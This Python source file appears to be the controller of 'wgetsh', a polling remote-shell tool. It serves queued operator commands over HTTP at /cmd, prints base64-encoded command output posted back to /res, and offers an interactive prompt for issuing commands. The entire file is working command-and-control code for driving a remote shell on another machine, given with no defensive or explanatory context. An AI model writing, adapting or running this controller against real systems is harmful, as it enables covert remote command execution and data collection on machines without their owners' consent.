import cmd, sys
import http.server
import socketserver
from threading import Thread, current_thread
import time
import base64

class Server(Thread):

    class MyHttpRequestHandler(http.server.BaseHTTPRequestHandler):

        get_command_func = None
        clear_command_func = None

        def log_message(self, format, *args):
            return

        def do_POST(self):
            if self.path == "/res":
                self.send_response(200)
                self.end_headers()
                self.wfile.write("OK".encode("utf-8"))
                content_length = int(self.headers['Content-Length'])
                post_data_bytes = self.rfile.read(content_length)

                result = base64.b64decode(post_data_bytes)
                print(result.decode('utf-8'))
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write("Not Found")
            return

        def do_GET(self):
            if self.path == "/cmd":
                self.send_response(200)
                self.end_headers()
                self.wfile.write(self.get_command_func().encode('utf-8'))
                self.clear_command_func()
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write("Not Found")
            return

    def get_command(self):
        return self.command

    def set_command(self, command):
        self.command = command

    def clear_command(self):
        self.command = ""

    def exit(self):
        self.httpd.server_close()

    def run(self):
        self.port = 80
        self.set_command("")
        self.MyHttpRequestHandler.get_command_func = self.get_command
        self.MyHttpRequestHandler.clear_command_func = self.clear_command
        with socketserver.TCPServer(("", self.port), self.MyHttpRequestHandler) as self.httpd:
            print("Http Server Serving at port", self.port)
            self.httpd.serve_forever()

class WGetShell(cmd.Cmd):
    intro = 'Welcome to the wgetsh.\n'
    prompt = '(wgetsh) '

    def apply_server(self, server):
        self.server = server

    def default(self, arg):
        if arg != "":
            self.server.set_command(arg)

    def do_exit(self, arg):
        print('Thank you for using wgetsh')
        self.server.set_command("exit")
        time.sleep(2)
        self.server.exit()
        self.server.join()
        return True

if __name__ == '__main__':


    # Start http server
    server = Server()
    server.start()

    # Start command loop
    sh =  WGetShell()
    sh.apply_server(server)
    sh.cmdloop()
